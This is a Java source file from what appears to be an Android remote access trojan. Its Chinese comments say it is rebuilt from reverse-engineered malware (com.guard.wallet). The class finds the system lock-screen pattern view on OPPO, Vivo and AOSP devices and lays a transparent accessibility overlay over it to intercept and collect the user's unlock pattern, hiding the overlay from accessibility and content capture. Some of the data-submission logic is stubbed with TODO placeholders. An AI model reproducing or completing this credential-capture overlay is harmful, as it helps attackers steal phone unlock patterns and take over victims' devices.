package com.vendor.rat.helper;

import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.service.MyAccessibilityService;
import com.vendor.rat.utils.DeviceUtils;

import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 图案锁采集覆盖层
 *
 * 基于逆向: com/guard/wallet/helper/o.java (303行)
 * - 创建透明图案锁覆盖层拦截手势
 * - 厂商适配: OPPO/Vivo/Samsung/AOSP
 * - 使用 TYPE_ACCESSIBILITY_OVERLAY (2032)
 */
public abstract class PatternCaptureOverlay {

    private static final String TAG = "PatternCaptureOverlay";

    // ADAPT: vendor f160a — WindowManager 引用
    public static WindowManager windowManager;

    // ADAPT: vendor b — 图案锁数据插件 (com.guard.wallet.plug.d)
    // TODO: VENDOR_VERIFY — plug.d 类尚未复刻，暂用 Object 占位
    // public static final PatternLockPlug patternPlug = new PatternLockPlug();

    // ADAPT: vendor c — 并发锁
    public static final ReentrantLock lock = new ReentrantLock();

    // ADAPT: vendor f161d — 订阅ID队列
    public static final ConcurrentLinkedQueue<String> subscribeQueue = new ConcurrentLinkedQueue<>();

    // ADAPT: vendor f162e — 当前 CombineFilter 引用
    public static final AtomicReference<CombineFilter> currentFilter = new AtomicReference<>();

    // ADAPT: vendor f163f — 图案锁 View 引用
    public static final AtomicReference<View> patternViewRef = new AtomicReference<>();

    /**
     * OPPO 图案锁 filter
     * ADAPT: vendor a() — colorLockPatternView
     */
    public static CombineFilter oppoPatternFilter() {
        return CombineFilter.and(
                StringCondition.viewId("com.android.systemui:id/colorLockPatternView"));
    }

    /**
     * AOSP 图案锁 filter
     * ADAPT: vendor b() — lockPatternView
     */
    public static CombineFilter aospPatternFilter() {
        return CombineFilter.and(
                StringCondition.viewId("com.android.systemui:id/lockPatternView"));
    }

    /**
     * Vivo 图案锁 filter
     * ADAPT: vendor l() — vivo_lock_pattern_view
     */
    public static CombineFilter vivoPatternFilter() {
        return CombineFilter.and(
                StringCondition.viewId("com.android.systemui:id/vivo_lock_pattern_view"));
    }

    /**
     * 创建图案锁覆盖层 (主线程)
     * ADAPT: vendor c(o.e, ReqListenHelper) — 查找图案锁节点并创建覆盖 View
     * TODO: VENDOR_VERIFY — vendor 使用 o0.h (PatternLockView) 自定义控件
     * 此处暂用占位实现，因 PatternLockView / plug.d 尚未复刻
     */
    public static void createPatternOverlay(UiNode rootNode, String subscribeId) {
        try {
            UiNode patternNode = findPatternNode(rootNode);
            if (patternNode == null) {
                return;
            }

            // TODO: VENDOR_VERIFY — vendor 创建 o0.h (PatternLockView) 并配置样式
            // 此处仅创建占位 View
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
            layoutParams.flags = 4786090;
            layoutParams.format = 1;
            layoutParams.alpha = 1.0f;
            layoutParams.dimAmount = 0.05f;
            applyBounds(layoutParams, patternNode.boundsInScreen());

            View placeholderView = new View(MyAccessibilityService.P());
            placeholderView.setSystemUiVisibility(4);
            placeholderView.setImportantForAccessibility(2);
            if (Build.VERSION.SDK_INT >= 30) {
                placeholderView.setImportantForContentCapture(2);
            }

            if (windowManager == null) {
                windowManager = (WindowManager) MyAccessibilityService.P()
                        .getSystemService("window");
            }
            layoutParams.type = 2032; // TYPE_ACCESSIBILITY_OVERLAY

            if (patternViewRef.get() == null) {
                windowManager.addView(placeholderView, layoutParams);
                patternViewRef.set(placeholderView);
                subscribeQueue.offer(
                        (subscribeId == null || subscribeId.isEmpty())
                                ? "NULL_REQ_LISTEN_HELPER" : subscribeId);
                // TODO: VENDOR_VERIFY — vendor 设置 dVar.b = reqListenHelper
                Log.d(TAG, "patternLockView 创建完成");
            }
        } catch (Exception e) {
            Log.e(TAG, "createPatternOverlay error", e);
        }
    }

    /**
     * 启动图案锁监听
     * ADAPT: vendor d(o.e, CombineFilter, ReqListenHelper)
     */
    public static void startPatternListening(UiNode rootNode,
            CombineFilter combineFilter, String subscribeId) {
        try {
            if (MyAccessibilityService.P() == null || isListening()
                    || !subscribeQueue.isEmpty()) {
                return;
            }
            if (lock.tryLock()) {
                try {
                    currentFilter.set(combineFilter);
                    if (isMainThread()) {
                        createPatternOverlay(rootNode, subscribeId);
                    } else {
                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
                            createPatternOverlay(rootNode, subscribeId);
                        }, 300L);
                    }
                } finally {
                    lock.unlock();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "startPatternListening error", e);
        }
        isListening(); // ADAPT: vendor 尾部调用 i()
    }

    /**
     * 移除图案锁覆盖层
     * ADAPT: vendor e()
     */
    public static void removePatternOverlay() {
        try {
            if (windowManager != null && patternViewRef.get() != null) {
                Log.d(TAG, "removeViewImmediate patternView");
                windowManager.removeViewImmediate(patternViewRef.get());
                // TODO: VENDOR_VERIFY — vendor 调用 ((o0.h) ref.get()).c() 清理
            }
            currentFilter.set(null);
            patternViewRef.set(null);
            subscribeQueue.clear();
            Log.d(TAG, "isPatternListening:" + isListening());
        } catch (Exception e) {
            Log.e(TAG, "removePatternOverlay error", e);
        }
    }

    /**
     * 停止图案锁监听并提交/清理数据
     * ADAPT: vendor f(String, boolean)
     * @param pattern 图案数据
     * @param submit true=提交数据, false=清理
     */
    public static void stopPatternListening(String pattern, boolean submit) {
        try {
            if (lock.tryLock()) {
                try {
                    if (!submit) {
                        // ADAPT: vendor dVar.f189a.clear()
                    } else {
                        // TODO: VENDOR_VERIFY — vendor plug.d 提交逻辑
                        // if (pattern == null || pattern.isEmpty()) { dVar.a(); }
                        // else { dVar.c.set(pattern); dVar.a(); }
                    }
                    if (isMainThread()) {
                        removePatternOverlay();
                    } else {
                        new Handler(Looper.getMainLooper()).post(() -> removePatternOverlay());
                    }
                } finally {
                    lock.unlock();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "stopPatternListening error", e);
        }
        isListening(); // ADAPT: vendor 尾部调用 i()
    }

    /**
     * 查找图案锁节点
     * ADAPT: vendor g(o.e) — 按厂商优先级查找图案锁 View
     */
    public static UiNode findPatternNode(UiNode rootNode) {
        try {
            // 优先使用当前 filter
            CombineFilter filter = currentFilter.get();
            if (filter != null) {
                if (rootNode != null) {
                    UiNode found = rootNode.findOneByCombine(filter);
                    if (found != null) return found;
                }
                UiNode cachedRoot = MyAccessibilityService.getCachedRoot();
                if (cachedRoot != null) {
                    UiNode found = cachedRoot.findOneByCombine(filter);
                    if (found != null) return found;
                }
            }

            // 按厂商查找
            if (DeviceUtils.isOppo()) {
                return findByFilter(rootNode, oppoPatternFilter());
            }
            if (DeviceUtils.isVivo()) {
                return findByFilter(rootNode, vivoPatternFilter());
            }
            // AOSP 默认
            return findByFilter(rootNode, aospPatternFilter());
        } catch (Exception e) {
            Log.e(TAG, "findPatternNode error", e);
            return null;
        }
    }

    /**
     * 辅助: 在 rootNode 或 cachedRoot 中查找
     */
    private static UiNode findByFilter(UiNode rootNode, CombineFilter filter) {
        if (rootNode != null) {
            UiNode found = rootNode.findOneByCombine(filter);
            if (found != null) return found;
        }
        UiNode cachedRoot = MyAccessibilityService.getCachedRoot();
        if (cachedRoot != null) {
            return cachedRoot.findOneByCombine(filter);
        }
        return null;
    }

    /**
     * 是否有已采集的图案数据
     * ADAPT: vendor h()
     */
    public static boolean hasPatternData() {
        // TODO: VENDOR_VERIFY — vendor 检查 dVar.b != null && !dVar.f189a.isEmpty()
        return false;
    }

    /**
     * 图案锁覆盖层是否正在监听
     * ADAPT: vendor i()
     */
    public static boolean isListening() {
        return patternViewRef.get() != null && windowManager != null;
    }

    /**
     * 设置覆盖层位置和大小
     * ADAPT: vendor j(LayoutParams, Rect)
     */
    public static void applyBounds(WindowManager.LayoutParams params, Rect rect) {
        params.gravity = 8388659; // Gravity.START | Gravity.TOP
        params.x = rect.left;
        params.y = rect.top;
        params.width = rect.width();
        params.height = rect.height();
        Log.d(TAG, "screenWidth:" + rect.width());
        Log.d(TAG, "screenHeight:" + rect.height());
    }

    // ADAPT: vendor 使用 com.guard.wallet.utils.k.a() 判断主线程
    private static boolean isMainThread() {
        return Looper.myLooper() == Looper.getMainLooper();
    }

    // TODO: VENDOR_VERIFY — vendor k() 配置 PatternLockView 样式
    // 按厂商设置颜色/大小/动画参数，依赖 o0.h (PatternLockView) 自定义控件
    // 此处暂不实现，待 PatternLockView 复刻后补充
}
